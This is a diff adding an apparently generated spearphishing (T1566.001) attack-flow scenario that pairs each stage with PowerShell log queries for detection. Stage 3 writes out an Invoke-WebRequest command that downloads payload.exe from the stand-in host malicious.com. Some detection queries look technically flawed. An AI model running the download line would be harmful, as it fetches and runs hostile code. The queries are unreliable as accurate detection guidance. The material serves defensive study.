@@ -1,0 +1,52 @@
+<output>
+Pattern Name: T1566.001 (Spearphishing Attachment)
+Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that, when opened, executes a payload leading to further exploitation of the victim's system. The attack involves multiple applications, including Outlook for email delivery, and a web browser for downloading additional payloads.
+
+Attack Flow Breakdown:
+
+1. **Initial Access via Email**
+   - **Application Involved**: Outlook
+   - **User Action**: The user receives an email with a subject line that appears legitimate, enticing them to open the attachment.
+   - **Key Artifacts**: Email headers, attachment file (e.g., `Invoice.docx`).
+   - **Loggable Events**:
+     - Email received: `Get-MessageTrace -StartDate (Get-Date).AddDays(-1) -EndDate (Get-Date) -SenderAddress "attacker@example.com"`
+     - Attachment opened: `Get-EventLog -LogName "Application" -Source "Microsoft Office Alerts"`
+
+2. **Execution of Malicious Document**
+   - **Application Involved**: Microsoft Word (part of Office Suite)
+   - **User Action**: The user opens the attachment, which contains a macro designed to execute a PowerShell command.
+   - **Key Artifacts**: Malicious macro code embedded in `Invoice.docx`.
+   - **Loggable Events**:
+     - Macro execution: `Get-WinEvent -LogName "Microsoft-Windows-Office/Operational" | Where-Object { $_.Id -eq 1000 }`
+     - PowerShell command execution: `Get-WinEvent -LogName "Windows PowerShell" | Where-Object { $_.Message -like "*Invoke-WebRequest*"}`
+
+3. **Payload Download and Execution**
+   - **Application Involved**: PowerShell
+   - **User Action**: The macro executes a PowerShell command that downloads a malicious executable from a remote server.
+   - **Key Artifacts**: URL of the malicious payload (e.g., `http://malicious.com/payload.exe`).
+   - **Loggable Events**:
+     - PowerShell command to download payload: `Invoke-WebRequest -Uri "http://malicious.com/payload.exe" -OutFile "C:\Users\User\Downloads\payload.exe"`
+     - Network connection to malicious server: `Get-NetTCPConnection | Where-Object { $_.RemoteAddress -eq "malicious.com" }`
+
+4. **Execution of the Malicious Payload**
+   - **Application Involved**: Windows Explorer
+   - **User Action**: The downloaded executable is run, either automatically or by the user.
+   - **Key Artifacts**: Executable file (`payload.exe`).
+   - **Loggable Events**:
+     - Executable run: `Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4688 -and $_.NewProcessName -like "*payload.exe*"}`
+
+5. **Establishing Persistence**
+   - **Application Involved**: Windows Registry
+   - **User Action**: The payload modifies the registry to ensure it runs on startup.
+   - **Key Artifacts**: Registry keys added for persistence (e.g., `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`).
+   - **Loggable Events**:
+     - Registry modification: `Get-WinEvent -LogName "Microsoft-Windows-Security-Auditing" | Where-Object { $_.Id -eq 4657 -and $_.ObjectType -like "*Registry*"}`
+
+6. **Data Exfiltration**
+   - **Application Involved**: Web Browser (e.g., Chrome)
+   - **User Action**: The malware initiates a connection to exfiltrate sensitive data to the attacker's server.
+   - **Key Artifacts**: URLs used for data exfiltration (e.g., `http://malicious.com/exfiltrate`).
+   - **Loggable Events**:
+     - Outbound connection to exfiltration server: `Get-NetTCPConnection | Where-Object { $_.RemoteAddress -eq "malicious.com" -and $_.State -eq "Established" }`
+
+</output>
